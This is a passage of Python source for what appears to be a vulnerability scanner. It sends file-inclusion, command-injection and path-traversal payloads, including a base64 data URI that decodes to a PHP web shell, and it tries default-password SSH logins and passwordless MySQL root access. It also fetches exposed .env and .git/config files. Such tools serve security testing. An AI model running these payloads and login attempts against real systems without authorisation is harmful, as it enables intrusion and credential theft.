        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [